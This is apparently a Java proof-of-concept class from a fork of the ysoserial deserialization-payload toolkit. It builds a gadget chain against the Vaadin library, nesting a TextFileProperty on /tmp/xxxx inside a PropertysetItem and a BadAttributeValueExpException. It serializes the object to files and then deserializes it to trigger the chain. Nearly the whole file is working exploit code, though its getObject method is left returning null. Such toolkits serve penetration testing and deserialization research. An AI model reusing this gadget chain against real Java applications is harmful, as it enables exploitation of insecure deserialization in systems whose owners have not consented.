package ysoserial.payloads.tabbyGadgetChains.Vaadin1;

import javax.management.BadAttributeValueExpException;
import com.vaadin.data.util.PropertysetItem;
import com.vaadin.data.util.TextFileProperty;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.Reflections;

import java.io.*;



// use TextFileProperty
public class Poc2 implements ObjectPayload<Object>
{

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(final String[] args) throws Exception {
        TextFileProperty textFileProperty = new TextFileProperty(new File("/tmp/xxxx"));


        Reflections.setFieldValue (textFileProperty, "file", new File("/tmp/xxxx"));
        PropertysetItem pItem = new PropertysetItem ();
        pItem.addItemProperty ("outputProperties", textFileProperty);

        BadAttributeValueExpException xxxx = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (xxxx, "val", pItem);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
        outputStream.writeObject(xxxx);
        outputStream.close();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test3.out"));
        objectOutputStream.writeObject(xxxx);
        objectOutputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));
        inputStream.readObject();
        System.out.println("xxxx");
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
